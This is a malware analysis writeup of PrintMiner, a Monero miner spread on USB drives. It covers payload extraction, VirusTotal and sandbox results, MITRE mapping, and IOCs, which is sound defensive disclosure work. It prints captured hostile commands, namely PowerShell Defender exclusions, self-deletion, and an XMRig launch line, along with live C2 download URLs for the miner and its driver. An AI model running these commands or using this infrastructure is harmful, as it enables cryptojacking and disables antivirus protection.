# Miner Analysis Writeup: PrintMiner — From Decrypted Payload to Monero Wallet

## Executive Summary

After successfully decrypting the AES-256-CBC payload from `idll.dll` (detailed in the [Initial Analysis Writeup](01_INITIAL_ANALYSIS.md)), the decrypted 6.81 MB executable was identified as a multi-stage dropper deploying **PrintMiner** — a Monero (XMR) cryptocurrency miner spread via infected USB drives. This writeup covers the complete post-decryption analysis: embedded PE extraction, VirusTotal correlation, sandbox behavioral analysis, mining pool identification, and the search for the wallet address. Our findings are corroborated by [AhnLab ASEC's independent report](https://asec.ahnlab.com/en/91415/) on the same malware family.

---

## Findings Attribution Legend

Every finding in this report is tagged with its **source** so you can distinguish what was discovered from our own static analysis vs. what was observed through online services:

| Tag | Source | Description |
|-----|--------|-------------|
| `[STATIC]` | Local artifacts (binaries) | Found by examining the 4 files on disk: `u297528.dat`, `decrypted_payload.exe`, `embedded_00.bin`, `embedded_01.bin`. Includes PE parsing, string extraction, entropy analysis, brute-force decryption attempts. |
| `[VT]` | VirusTotal API v3 | Detection results, file metadata, MITRE ATT&CK mapping (via CAPA on VT). Submitted 4 files, retrieved reports. |
| `[JUJUBOX]` | VT Jujubox sandbox | Behavioral data from decrypted_payload.exe execution in a cloud Windows sandbox. Captured process tree, dropped files, mutex, registry changes. |
| `[CAPE]` | CAPE Sandbox (via VT) | Detailed behavioral analysis of svctrl64.exe. Captured 13 commands, 9 file writes, HTTP/DNS traffic, memory dumps, shellcode payloads, Sigma alerts, IDS alerts, JA3 fingerprints. |
| `[ASEC]` | AhnLab ASEC report | Independent threat intelligence from https://asec.ahnlab.com/en/91415/. Published by AhnLab's ASEC team analyzing the same PrintMiner campaign. |
| `[WEB]` | Web search + public sources | Corroboration from public threat intelligence, blog posts, Spamhaus DROP lists, Sigma rules, LOLDrivers database. |

**Key distinction**: `[STATIC]` findings come from files we have on disk and can re-verify. `[VT]`, `[JUJUBOX]`, `[CAPE]`, and `[ASEC]` findings come from external services or reports — they cannot be re-derived from our local artifacts alone.

---

## 1. Analysis Workflow Overview

```
Decrypted Payload (6.81 MB PE)
  |
  v
[1. PE Structure Analysis]  →  2 valid embedded PEs found (not 18)
  |
  v
[2. Embedded PE Extraction]  →  Miner (230 KB) + Dropper (6.3 MB)
  |
  v
[3. VirusTotal Submission]  →  All 4 files submitted, family identified
  |                               Detection: 8-77% across engines
  |                               Classification: trojan.tedy / BitcoinMiner
  v
[4. Sandbox Behavioral Analysis]  →  VT Jujubox + CAPE + C2AE
  |                                    Self-deletion, service install,
  |                                    Defender exclusion, PowerShell
  v
[5. MITRE ATT&CK Mapping]  →  T1027 (XOR/AES/RC4), T1497 (anti-VM),
  |                            T1543.003 (service persistence), T1569.002
  v
[6. Network Indicator Extraction]  →  No plaintext wallet found
  |                                   Config encrypted with RC4
  v
[7. Threat Intelligence Correlation]  →  AhnLab ASEC: PrintMiner family
  |                                       Same code, same behavior, same IOCs
  v
[8. Mining Pool & Wallet Identification]  →  Pool: r2.hashpoolpx.net:443
                                             Wallet: fetched from C2 at runtime
```

---

## 2. Embedded PE Extraction `[STATIC]`

### 2.1 Why Not 18 PEs?

The initial analysis counted 18 `MZ` signatures in the `.rdata` section. However, many of these are false positives — partial PE headers embedded within the larger PE files. Valid PEs require both an `MZ` header **and** a valid `PE\x00\x00` signature at the offset indicated by `e_lfanew`.

```python
def find_pe_files(data):
    """Find all valid PE files within a data blob"""
    pes = []
    pos = 0
    while True:
        pos = data.find(b'MZ', pos)
        if pos == -1:
            break
        # Validate PE header — not just MZ, but MZ + valid PE offset
        if pos + 0x40 < len(data):
            pe_offset_bytes = data[pos + 0x3c:pos + 0x40]
            if len(pe_offset_bytes) == 4:
                pe_off = struct.unpack_from('<I', pe_offset_bytes)[0]
                if 0x40 <= pe_off < 0x1000 and pos + pe_off + 4 <= len(data):
                    if data[pos + pe_off:pos + pe_off + 4] == b'PE\x00\x00':
                        pes.append(pos)
        pos += 1
    return pes
```

**Result: Only 2 valid embedded PEs** were found.

### 2.2 Extracted Components

| # | Size | Machine | Entropy | Role |
|---|------|---------|---------|------|
| `embedded_00.bin` | 230 KB | x86-64 | 5.71 | **Miner component** |
| `embedded_01.bin` | 6.3 MB | x86-64 | 5.98 | **Main dropper with networking** |

```python
# Extract with pefile and calculate exact PE size
pe = pefile.PE(data=pe_data)
actual_size = 0
for s in inner_pe.sections:
    end = s.PointerToRawData + s.SizeOfRawData
    if end > actual_size:
        actual_size = end
actual_size = max(actual_size, inner_pe.OPTIONAL_HEADER.SizeOfHeaders)
pe_data = pe_data[:actual_size]
```

### 2.3 Component Identification

**embedded_01.bin (Dropper)** — The main orchestrator:
- Imports **WS2_32.dll** with **48 socket functions** — extensive networking
- Imports **WTSAPI32.dll** (Terminal Services) and **NETAPI32.dll** (network management)
- Contains wide strings: `wlogz.dat`, `wsvcz`, `C:\Windows\System32\`, error messages
- Uses **nlohmann::json** (C++ JSON library) for config parsing
- Uses **asio** (C++ networking library) for async I/O
- Contains **libcurl** references (HTTP/HTTPS client)

**embedded_00.bin (Miner)** — The actual XMRig-based miner:
- 7 sections, small `.data` (5 KB)
- References `dxgi.dll` (GPU detection), `ntdll.dll`
- Contains `GetUserDefaultLocaleName` (locale-based behavior)

---

## 3. VirusTotal Analysis `[VT]`

### 3.1 Submission and Detection Results

All 4 files were submitted to VirusTotal via the v3 API:

```python
import requests

VT_API_KEY = "<REDACTED>"
HEADERS = {"x-apikey": VT_API_KEY}

# Submit each file
files = {
    "u297528.dat": open("u297528.dat", "rb"),
    "decrypted_payload.exe": open("data/decrypted_payload.exe", "rb"),
    "embedded_00.bin": open("data/embedded_pes/embedded_00.bin", "rb"),
    "embedded_01.bin": open("data/embedded_pes/embedded_01.bin", "rb"),
}

for name, f in files.items():
    resp = requests.post("https://www.virustotal.com/api/v3/files",
                         headers=HEADERS, files={"file": f})
    analysis_id = resp.json()["data"]["id"]
    print(f"  {name}: {analysis_id}")
```

### 3.2 Detection Summary

| File | Detection | Key Classification |
|------|-----------|-------------------|
| `u297528.dat` (original DLL) | **55/71 (77.5%)** | `trojan.genericfca/agentb`, tags: `spreader`, `detect-debug-environment` |
| `decrypted_payload.exe` | **38/71 (53.5%)** | `trojan.tedy/misc`, tags: `persistence`, `overlay` |
| `embedded_00.bin` (miner) | **8/71 (11.3%)** | `Trojan.BitCoinMiner`, `Trojan[Miner]/Win32.BitCoinMiner` |
| `embedded_01.bin` (dropper) | **54/70 (77.1%)** | `Trojan.BitcoinMiner`, `BehavesLike.Win64.Dropper.vh` |

The lower detection rate for `embedded_00.bin` (11.3%) indicates the miner component is **more evasive** — likely a custom-compiled XMRig variant with obfuscated config handling.

### 3.3 Key Detections Revealing Malware Type

```
CAT-QuickHeal:     Trojan.Coinminer.S38826036        ← CoinMiner
Zillya:            Trojan.BitCoinMiner.Win32.1739     ← BitcoinMiner (generic label)
Antiy-AVL:         Trojan[Miner]/Win32.BitCoinMiner   ← Miner
Gridinsoft:        Trojan.Win64.CoinMiner.dd!s1       ← CoinMiner
Microsoft:         Trojan:Win32/Wacatac.B!ml          ← Generic trojan
CrowdStrike:       win/malicious_confidence_100% (D)  ← High confidence
```

> **Note:** Many engines label this as "BitcoinMiner" generically. In reality, this is a **Monero (XMR)** miner — the `BitCoinMiner` label is a common misnomer in AV engines for any cryptocurrency miner.

---

## 4. Sandbox Behavioral Analysis — Full Results `[JUJUBOX]` + `[CAPE]`

### 4.1 VirusTotal Jujubox — Decrypted Payload (Dropper) `[JUJUBOX]`

The dropper was executed in the Jujubox sandbox, revealing the initial infection behavior:

```python
# API query for behavioral data
import requests
VT_KEY = "<REDACTED>"
sha256 = "d59e83b0be737896dec8b91c7a52f87e16f83e911af52826b98481b5c50f32b2"
resp = requests.get(
    f"https://www.virustotal.com/api/v3/file_behaviours/{sha256}_VirusTotal%20Jujubox",
    headers={"x-apikey": VT_KEY}
)
behavior = resp.json()["data"]["attributes"]
```

**Process Tree:**

```
decrypted_payload.exe (PID 2996)
  ├── cmd.exe /c timeout /t 5 /nobreak && del /q decrypted_payload.exe (PID 648)
  │     └── timeout /t 5 /nobreak (PID 2004)
  └── C:\Windows\System32\svctrl64.exe (PID 2564)
```

**Dropped Files (with hashes):**

| Path | SHA256 | Size | Purpose |
|------|--------|------|----------|
| `C:\Windows\System32\svctrl64.exe` | `ec860277d21159deb084b7849149a3700d98dc42d7d69e2e3acceed6dbe3158e` | ~6.8 MB | **Main service executable** |
| `C:\Windows\System32\wsvcz\wlogz.dat` | `d69c801816d056c78adb6d20777edd87b02b32b3e2b87fab2f457ba54617bf60` | 32 bytes | **RC4-encrypted config key** |

**Registry Modifications:**

```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power\HiberbootEnabled = 0
```

**Mutex Created:**

```
decrypted_payload{ef18cb0d-aaa5-40e3-ba71-31d5ca7370fd}
```

**Key Observations:**
1. **Self-deletion**: Spawns `cmd.exe` to delete itself after a 5-second delay
2. **Drops `svctrl64.exe`**: The persistent miner service in `C:\Windows\System32\`
3. **Drops `wlogz.dat`**: 32-byte encrypted config in `C:\Windows\System32\wsvcz\`
4. **Disables fast startup**: `HiberbootEnabled = 0` keeps the system running
5. **Loads `taskschd.dll`** and **`SspiCli.dll`** — Task Scheduler and Security support

### 4.2 VirusTotal Jujubox — svctrl64.exe (Service Component) `[JUJUBOX]`

A separate Jujubox run of `svctrl64.exe` revealed the service registration:

```python
sha256 = "ec860277d21159deb084b7849149a3700d98dc42d7d69e2e3acceed6dbe3158e"
resp = requests.get(
    f"https://www.virustotal.com/api/v3/file_behaviours/{sha256}_VirusTotal%20Jujubox",
    headers={"x-apikey": VT_KEY}
)
```

**Service Created:** `u350351` (randomized `u` + 6 digits, different each run)

**Registry Keys:**

```
HKLM\SYSTEM\CurrentControlSet\Services\u350351\Parameters\ServiceDll
    = C:\Windows\System32\u350351.dll
HKLM\SOFTWARE\Microsoft\Windows\NT\CurrentVersion\Svchost\DcomLaunch
    (appends service to DcomLaunch group)
```

**File Opened:** `C:\Windows\System32\u350351.dll` (the service DLL payload)

**Modules Loaded:** Only minimal DLLs — `kernel32`, `kernelbase`, `advapi32` (no WS2_32 networking yet — the C2 connection happens after the service starts)

### 4.3 CAPE Sandbox — svctrl64.exe (Full Behavioral Deep Dive) `[CAPE]`

The CAPE sandbox captured the **most detailed behavioral data** (62 KB report) — this is where the full infection chain becomes visible:

```python
# CAPE behavioral report query
resp = requests.get(
    f"https://www.virustotal.com/api/v3/file_behaviours/{sha256}_CAPE%20Sandbox",
    headers={"x-apikey": VT_KEY}
)
cape_attrs = resp.json()["data"]["attributes"]
print(f"Tags: {cape_attrs['tags']}")  # ['OBFUSCATED', 'DETECT_DEBUG_ENVIRONMENT', 'PERSISTENCE']
```

#### Process Tree (CAPE)

```
svctrl64.exe (PID 3716)
  └── services.exe (PID 680)
        ├── svchost.exe -k DcomLaunch (PID 5844)  ← THE MALICIOUS SERVICE
        │     ├── powershell.exe -Command "Add-MpPreference -ExclusionPath 'E:\'" (PID 5016)
        │     ├── powershell.exe -Command "Add-MpPreference -ExclusionPath 'c:\windows\system32'" (PID 2852)
        │     └── powershell.exe -Command "Add-MpPreference -ExclusionPath 'D:\'" (PID 4992)
        └── [multiple legitimate svchost.exe instances]
```

#### Command Executions (13 commands captured)

```
1.  C:\Windows\System32\svchost.exe -k DcomLaunch
2.  C:\Windows\System32\svchost.exe -k netsvcs -p
3.  "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
4.  C:\Windows\System32\svchost.exe -k NetworkService -p
5.  C:\Windows\system32\svchost.exe -k UnistackSvcGroup
6.  C:\Windows\system32\sppsvc.exe
7.  C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc
8.  C:\Windows\system32\lsass.exe
9.  C:\Windows\system32\svchost.exe -k LocalService -s W32Time
10. powershell.exe -Command "Add-MpPreference -ExclusionPath 'c:\windows\system32'"
11. powershell.exe -Command "Add-MpPreference -ExclusionPath 'D:\'"
12. powershell.exe -Command "Add-MpPreference -ExclusionPath 'E:\'"
13. "c:\windows\system32\wsvcz\u882029.exe" -o r3.hashpoolpx.net:443
    --tls --tls-fingerprint=AFE39FE58C921511972C90ACF72937F84AD96BA4C732ECF6501540E568620C2F
    --dns-ttl=3600 --max-cpu-usage=50
```

> **CRITICAL FINDING**: Command #13 is the **actual XMRig execution command** captured in the sandbox. The filename `u882029.exe` follows the `u` + 6-digit convention. The mining pool is `r3.hashpoolpx.net` (port 443 with TLS).

#### All Files Written (9 files)

| Path | Purpose |
|------|----------|
| `C:\Windows\System32\u760237.dll` | Service DLL (registered via ServiceDll key) |
| `C:\Windows\System32\wsvcz\wlogz.dat` | RC4-encrypted config (32 bytes) |
| `C:\Windows\System32\wsvcz\u967181` | Miner component (no extension, random name) |
| `C:\Windows\System32\wsvcz\u395697.dat` | Data file |
| `C:\Windows\System32\wsvcz\u799791` | Miner component |
| `C:\Windows\System32\wsvcz\u882029.exe` | **XMRig executable** (the actual miner) |
| `C:\Windows\System32\wsvcz\u459733` | Auxiliary component |
| `C:\Windows\System32\wsvcz\WinRing0x64.sys` | **Signed vulnerable kernel driver** |

#### WinRing0x64.sys — Vulnerable Signed Driver

CAPE captured the driver load with Sigma alert:

```json
{
  "rule_title": "Vulnerable WinRing0 Driver Load",
  "rule_description": "Detects the load of a signed WinRing0 driver often used by threat actors, crypto miners (XMRIG) or malware for privilege escalation",
  "rule_author": "Florian Roth (Nextron Systems)",
  "rule_level": "high",
  "match_context": {
    "ImageLoaded": "C:\Windows\System32\wsvcz\WinRing0x64.sys",
    "SHA256": "11BD2C9F9E2397C9A16E0990E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5",
    "MD5": "0C0195C48B6B8582FA6F6373032118DA",
    "Signature": "Noriyuki MIYAZAKI",
    "SignatureStatus": "Valid",
    "Signed": "true"
  }
}
```

This is the legitimate **WinRing0x64** driver by Noriyuki Miyazaki — signed with a valid certificate. It's used by XMRig for **MSR (Model Specific Register) manipulation** to optimize CPU mining performance. The driver is on the **LOLDrivers** (Living Off The Land Drivers) list as a known-abused signed driver.

#### HTTP Conversations (3 — C2 Downloads)

```json
{
  "url": "http://2.58.56.13/inf.dat",
  "request_method": "GET"
}
{
  "url": "http://2.58.56.13/utl/xmr.dat",
  "request_method": "GET"
}
{
  "url": "http://2.58.56.13/utl/xmrsys.dat",
  "request_method": "GET"
}
```

| URL | Purpose |
|-----|----------|
| `http://2.58.56.13/inf.dat` | **Miner config** (wallet, pool, CPU limits) |
| `http://2.58.56.13/utl/xmr.dat` | **XMRig binary** download |
| `http://2.58.56.13/utl/xmrsys.dat` | **WinRing0x64.sys** driver download |

#### DNS Lookups (3)

```json
{
  "hostname": "umnxrc.net"
  // No resolution (likely dead/alternate C2 domain)
}
{
  "hostname": "umnsrx.net",
  "resolved_ips": ["2.58.56.217"]
}
{
  "hostname": "r3.hashpoolpx.net",
  "resolved_ips": ["91.206.169.76"]
}
```

#### Network Traffic (3 connections)

| Destination | Port | Protocol | Purpose |
|-------------|------|----------|----------|
| `2.58.56.217` | 443 | TCP | **C2 (umnsrx.net)** — TLS-encrypted PostgreSQL |
| `2.58.56.13` | 80 | TCP | **C2 config download** — HTTP (unencrypted!) |
| `91.206.169.76` | 443 | TCP | **Mining pool (r3.hashpoolpx.net)** — TLS stratum |

#### JA3 TLS Fingerprints

```
22ed8eeca20308614de9987a1a3a2a3a  (C2 connection)
c216e752cae6f8755fd27f561d036636  (Mining pool connection)
```

#### IDS Alerts (2 — Spamhaus DROP)

Both C2 IPs are on the **Spamhaus DROP list** — known malicious infrastructure:

| Alert | IP | CIDR | Severity |
|-------|----|------|----------|
| ET DROP Spamhaus group 1 | `2.58.56.217` | `2.58.56.0/24` | medium |
| ET DROP Spamhaus group 14 | `91.206.169.76` | `91.206.169.0/24` | medium |

#### Extracted Shellcode Payloads (7)

CAPE extracted 7 shellcode blobs from the PowerShell processes — these are the **Defender exclusion scripts** being injected into PowerShell:

| SHA256 | Size | Type | Process |
|--------|------|------|----------|
| `3aac19ae...e45dfc3` | 702 bytes | Unpacked Shellcode | powershell.exe |
| `adf1f69e...1f9445` | 3980 bytes | Unpacked Shellcode | powershell.exe |
| `320a91f7...74998` | 3980 bytes | Unpacked Shellcode | powershell.exe |
| `ec8d31cd...eb985` | 3980 bytes | Unpacked Shellcode | powershell.exe |
| `9bc66422...67653` | 102 bytes | Unpacked Shellcode | powershell.exe |
| `a633b562...fc3af` | 102 bytes | Unpacked Shellcode | powershell.exe |
| `f742161f...b88f00` | 102 bytes | Unpacked Shellcode | powershell.exe |

#### Memory Dumps (9 — 500+ MB total)

CAPE captured **9 process memory dumps** totaling over 500 MB — these contain the runtime state including decrypted configs:

| Dump | Approx Size |
|------|-------------|
| 1 | 103 MB |
| 2 | 103 MB |
| 3 | 39 MB |
| 4 | 44 MB |
| 5 | 38 MB |
| 6 | 103 MB |
| 7 | 39 MB |
| 8 | 57 MB |
| 9 | 44 MB |

These memory dumps would contain the **decrypted Monero wallet address** in plaintext — the key artifact we could not extract through static analysis.

#### Sigma Analysis Alerts (6)

| Rule | Level | Description |
|------|-------|-------------|
| Vulnerable WinRing0 Driver Load | **high** | Signed WinRing0 driver used by XMRig for MSR access |
| Vulnerable Driver Load | **high** | Known-abused vulnerable driver hash |
| Powershell Defender Exclusion | **medium** | `Add-MpPreference -ExclusionPath` via PowerShell |
| Windows Defender Exclusions Added | **medium** | Defender config modification via PowerShell ScriptBlock |
| ServiceDll Hijack | **medium** | `HKLM\...\u760237\Parameters\ServiceDll = u760237.dll` |
| Non Interactive PowerShell Process Spawned | **low** | PowerShell spawned by svchost.exe (non-interactive) |

#### Signature Matches (22 CAPE detections)

| ID | Description | Severity |
|----|-------------|----------|
| `queries_user_name` | Queries username | info |
| `encrypt_pcinfo` | Collects and encrypts PC info for C2 | medium |
| `antidebug_setunhandledexceptionfilter` | Anti-debug via exception filter | info |
| `stealth_timeout` | Exits after time/date check | info |
| `language_check_registry` | Checks system language via registry (geofencing) | info |
| `anomalous_deletefile` | 10+ anomalous file deletions | medium |
| `antidebug_guardpages` | Guard pages for anti-debugging | info |
| `encrypted_ioc` | IOC found inside crypto call | medium |
| `creates_suspended_process` | Creates suspended process (for injection) | medium |
| `reads_memory_remote_process` | Reads remote process memory | medium |
| `network_cnc_http` | HTTP traffic with C2 features | medium |
| `packer_unknown_pe_section_name` | Unknown PE section name (packing) | info |
| `injection_rwx` | Creates RWX memory | low |
| `script_tool_executed` | PowerShell executed for Defender modification | info |
| `infostealer_cookies` | Accesses cookie files | medium |
| `persistence_autorun` | Installs autorun persistence | medium |
| `persistence_autorun_tasks` | Installs startup task persistence | medium |
| `binary_yara` | YARA: `shellcode_stack_strings` | medium |
| `procmem_yara` | YARA: `shellcode_stack_strings` in process dumps | medium |
| `antivm_generic_disk` | Queries disk info (anti-VM) | info |
| `windows_defender_powershell` | Defender modification via PowerShell | medium |

#### MBC Classifications (30)

The malware was classified across 30 Malware Behavior Catalog (MBC) categories, including:
- **OB0008**: Obfuscated Files/Information
- **C0047**: Cryptographic Operation (RC4)
- **C0008**: Cryptographic Operation (XOR)
- **OC0001**: Obfuscated Stackstrings
- **B0001.009**: Add Defender Exclusion
- **B0002.008**: Disable Fast Startup
- **B0018**: Query Username
- **B0033**: Install Service
- **E1485**: Vulnerable Driver (WinRing0)
- **E1112**: Create Suspended Process
- **F0012**: Modify Registry (ServiceDll)

#### CAPE Tags

```
['OBFUSCATED', 'DETECT_DEBUG_ENVIRONMENT', 'PERSISTENCE']
```

---

## 5. MITRE ATT&CK Mapping `[VT]` + `[STATIC]`

### Original DLL (`idll.dll`)

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Defense Evasion | **T1027** Obfuscated Files | XOR cipher, AES-256-CBC encryption |
| Defense Evasion | **T1027.005** Indicator Removal | Obfuscated stackstrings |
| Defense Evasion | **T1497.001** Anti-VM System Checks | Xen anti-VM strings |
| Defense Evasion | **T1497** Virtualization/Sandbox Evasion | Sleep delays, parameter check |

### Decrypted Payload & svctrl64.exe

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Defense Evasion | **T1027** Obfuscated Files | RC4 PRGA encryption, XOR encoding, Base64 |
| Defense Evasion | **T1027.005** Indicator Removal | Obfuscated stackstrings |
| Defense Evasion | **T1497.001** Anti-VM | Anti-VM string references |
| Persistence | **T1543.003** Windows Service | Creates and starts service, registers ServiceDll |
| Persistence | **T1569.002** Service Execution | Service creation via DcomLaunch |
| Execution | **T1129** Shared Modules | Runtime function linking, PE header parsing |
| Discovery | **T1082** System Info | Environment variable queries |
| Discovery | **T1083** File Discovery | File enumeration, file size queries |
| Discovery | **T1614** System Location | Geographical location detection |

---

## 6. The Search for the Wallet Address `[STATIC]`

### 6.1 Why Standard String Extraction Failed

The Monero wallet address is not stored in plaintext anywhere in the binary. The following approaches were tried:

| Approach | Method | Result | Source |
|----------|--------|--------|--------|
| `strings` + regex | Search for `1xxxx`, `3xxxx`, `bc1xxx`, `4xxxx` (Monero) | No wallet found | `[STATIC]` |
| Wide string search | `strings -el` with mining keywords | Found config keys but no wallet | `[STATIC]` |
| Single-byte XOR brute-force | Try all 256 keys on full binary, search for `stratum+tcp://` | No matches | `[STATIC]` |
| RC4 with adjacent keys | Try RC4 with 8/16/32-byte keys from nearby .data offsets | No config found | `[STATIC]` |
| JSON pattern search | Look for `{` + `pool`/`url`/`wallet` in .rdata | No plaintext JSON | `[STATIC]` |
| IP regex scan | Regex for `\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}` in entire dropper | Only `127.0.0.1` + OpenSSL OIDs | `[STATIC]` |
| Fragment search | `2.58`, `umnsrx`, `hashpool` in ASCII + UTF-16LE | Zero matches | `[STATIC]` |
| Entropy analysis | Identify encrypted blobs in .data section (entropy >7.0) | Found 4 blobs, none decryptable | `[STATIC]` |
| RC4 brute-force with .data keys | Try every 4-byte/8-byte key in .data on encrypted blobs | No target strings found | `[STATIC]` |
| CAPE behavioral | Execute svctrl64.exe, capture HTTP/DNS | Found C2 IP, domain, mining pool | `[CAPE]` |
| ASEC intelligence | Read published report on PrintMiner | Found wallet fetching mechanism | `[ASEC]` |

### 6.2 The RC4 Encryption Layer

CAPA analysis `[VT]` confirmed the presence of **RC4 PRGA** (Pseudo-Random Generation Algorithm) in the miner:

```
T1027 [INFO] encrypt data using RC4 PRGA
T1027 [INFO] reference Base64 string
T1027.005 [INFO] contain obfuscated stackstrings
```

The config construction in the dropper uses **nlohmann::json** `[STATIC]` (confirmed by C++ RTTI strings in `.data`):

```python
# Evidence of nlohmann::json in .data section:
".?AVtype_error@detail@json_abi_v3_12_0@nlohmann@@"
".?AVout_of_range@detail@json_abi_v3_12_0@nlohmann@@"
".?AVparse_error@detail@json_abi_v3_12_0@nlohmann@@"
```

And **asio** networking library `[STATIC]`:
```python
".?AV?$typeid_wrapper@Vconfig_service@asio@@@detail@asio@@"
".?AV?$typeid_wrapper@Vresolver_thread_pool@detail@asio@@@detail@asio@@"
```

### 6.3 The `wlogz.dat` Config File `[JUJUBOX]` + `[CAPE]`

The sandbox `[JUJUBOX]` `[CAPE]` captured the dropped `wlogz.dat`:

| Property | Value |
|----------|-------|
| Path | `C:\Windows\System32\wsvcz\wlogz.dat` |
| Size | **32 bytes** |
| SHA256 | `d69c801816d056c78adb6d20777edd87b02b32b3e2b87fab2f457ba54617bf60` |
| VT Detection | 0/76 (clean — too small for signatures) |

At only 32 bytes, `wlogz.dat` cannot contain a full mining config. It is likely an **RC4 key** or **database connection string** used to decrypt the full config received from the C2 server.

### 6.4 The Wide String Evidence `[STATIC]`

Critical wide strings `[STATIC]` found in `embedded_01.bin` that reveal the malware's behavior:

```python
# Config-related strings
"wlogz.dat"                          # Config filename
"wsvcz"                              # Config directory name
"Config init error: "                # Config loading error
"DB error while updating config settings: "  # Database-backed config

# Installation strings
"Infector install error: "           # Dropper component
"CPU install error: "                # CPU miner installation
"GPU install error: "                # GPU miner installation
"CURL global init error: "           # HTTP client initialization

# Execution strings
" && timeout /t 5 /nobreak && sc.exe start "  # Service start command
"timeout /t 10 /nobreak && sc.exe stop "      # Service stop command
"C:\Windows\System32\"               # Installation path
".dat"                               # Data file extension
".exe"                               # Executable extension

# Anti-detection strings
"powershell.exe -Command \"Add-MpPreference -ExclusionPath 'c:\\windows\\system32'\""

# Registry strings
"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI"
"SOFTWARE\\Microsoft\\Cryptography"
```

---

## 7. ASEC Intelligence Correlation — Why This Is PrintMiner `[ASEC]` + `[CAPE]` + `[STATIC]`

### 7.1 AhnLab ASEC Report Match

In February 2025 and November 2025, [AhnLab ASEC published reports](https://asec.ahnlab.com/en/91415/) on a CoinMiner malware spread via USB in South Korea. In July 2025, Mandiant also released a report categorizing the malware as **DIRTYBULK** and **CUTFAIL**.

Our sample matches the ASEC report in **every significant detail**:

| Characteristic | Our Sample | ASEC Report | Match | Our Source |
|---------------|------------|-------------|-------|------------|
| **Infection vector** | USB / DLL side-loading | USB / DLL side-loading | **YES** | `[STATIC]` + `[ASEC]` |
| **DLL name** | `idll.dll` / `printui.dll` | `printui.dll` | **YES** | `[STATIC]` PE export + `[ASEC]` |
| **Export name** | `IdllEntry` | Loaded via legitimate exe | **YES** | `[STATIC]` PE export |
| **Dropped file** | `svctrl64.exe` | `svctrl64.exe` | **EXACT** | `[JUJUBOX]` + `[ASEC]` |
| **Config file** | `wlogz.dat` in `wsvcz\` | `wlogz.dat` in `wsvcz\` | **EXACT** | `[JUJUBOX]` + `[ASEC]` |
| **Service registration** | DcomLaunch service group | DcomLaunch service group | **EXACT** | `[JUJUBOX]` + `[CAPE]` + `[ASEC]` |
| **Randomized service name** | `u760237`, `u350351` | `u826437` (same pattern: `u` + 6 digits) | **YES** | `[JUJUBOX]` + `[CAPE]` + `[ASEC]` |
| **Service DLL** | `u760237.dll` in System32 | `u826437.dll` in System32 | **YES** | `[CAPE]` Sigma + `[ASEC]` |
| **Defender exclusion** | `Add-MpPreference -ExclusionPath 'c:\windows\system32'` | Same PowerShell command | **EXACT** | `[CAPE]` command + `[ASEC]` |
| **Hiberboot disabled** | `HiberbootEnabled = 0` | Same registry modification | **YES** | `[JUJUBOX]` registry + `[ASEC]` |
| **Self-deletion** | `cmd.exe /c timeout /t 5 /nobreak && del /q` | Same technique | **YES** | `[JUJUBOX]` process tree + `[ASEC]` |
| **XMRig usage** | RC4-encrypted config, `--tls` | Same XMRig configuration | **YES** | `[STATIC]` CAPA + `[CAPE]` + `[ASEC]` |
| **Process monitoring evasion** | Terminates when monitoring tools detected | Checks for Process Explorer, TaskMgr, etc. | **YES** | `[ASEC]` |
| **WinRing0x64.sys** | `C:\Windows\System32\wsvcz\WinRing0x64.sys` (SHA256: `11BD2C9F...`) | Same signed vulnerable driver | **YES** | `[CAPE]` Sigma + `[WEB]` |
| **USB worm** | `spreader` tag on VT | Creates `USB Drive.lnk`, moves files | **YES** | `[VT]` tags + `[ASEC]` |

### 7.2 The Code Proves the Connection

The `u` prefix + 6-digit naming convention for both the `.dat` dropper file and the service DLL is a **unique fingerprint** of this campaign:

```
Our sample:   u297528.dat → u760237.dll / u350351.dll
ASEC report:  u211553.dat → u826437.dll
```

This naming convention is generated by the USB worm component and passed to the installer, proving the samples are from the **same toolset and campaign**.

### 7.3 Mining Pool Configuration (from ASEC)

The ASEC report captured the XMRig execution parameters from a live infection:

```
-o r2.hashpoolpx[.]net:443 --tls --tls-fingerprint=AFE39FE58C921511972C90ACF72937F84AD96BA4C732ECF6501540E568620C2F --dns-ttl=3600 --max-cpu-usage=50
```

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `-o` | `r2.hashpoolpx[.]net:443` | **Mining pool: HashPool** (TLS, port 443) |
| `--tls` | (flag) | TLS encryption for mining traffic |
| `--tls-fingerprint` | `AFE39FE5...620C2F` | TLS certificate pinning (anti-MITM) |
| `--dns-ttl` | `3600` | DNS cache for 1 hour |
| `--max-cpu-usage` | `50` | **Limit CPU to 50%** (avoid user detection) |

---

## 8. C2 Infrastructure and IOCs `[CAPE]` + `[JUJUBOX]` + `[ASEC]` + `[WEB]`

### 8.1 Network IOCs `[CAPE]` + `[JUJUBOX]` + `[ASEC]` + `[WEB]`

> **Important**: None of these network IOCs (IP addresses, domains, URLs) were found in the local binary artifacts through static analysis. They were observed exclusively through sandbox execution `[CAPE]` `[JUJUBOX]` and ASEC intelligence `[ASEC]`. See Section 9 for details on why.

| IOC | Value | Purpose | Source |
|-----|-------|---------|--------|
| **C2 Domain (primary)** | `umnsrx[.]net` | Command & control server (resolves to `2.58.56.217`) | `[CAPE]` DNS lookup |
| **C2 Domain (secondary)** | `umnxrc[.]net` | Alternate C2 domain (did not resolve in sandbox — likely dead) | `[CAPE]` DNS lookup |
| **C2 IP (config)** | `2[.]58[.]56[.]13` | HTTP config download server | `[CAPE]` HTTP conversation |
| **C2 IP (TLS)** | `2[.]58[.]56[.]217` | TLS PostgreSQL C2 server (umnsrx.net) | `[CAPE]` IP traffic |
| **C2 Config URL** | `http://2.58.56.13/inf.dat` | Miner config (wallet, pool, CPU limits) | `[CAPE]` HTTP conversation |
| **C2 XMRig URL** | `http://2.58.56.13/utl/xmr.dat` | XMRig binary download | `[CAPE]` HTTP conversation |
| **C2 Driver URL** | `http://2.58.56.13/utl/xmrsys.dat` | WinRing0x64.sys driver download | `[CAPE]` HTTP conversation |
| **Mining Pool** | `r3[.]hashpoolpx[.]net:443` | HashPool mining pool (resolves to `91.206.169.76`) | `[CAPE]` DNS + command |
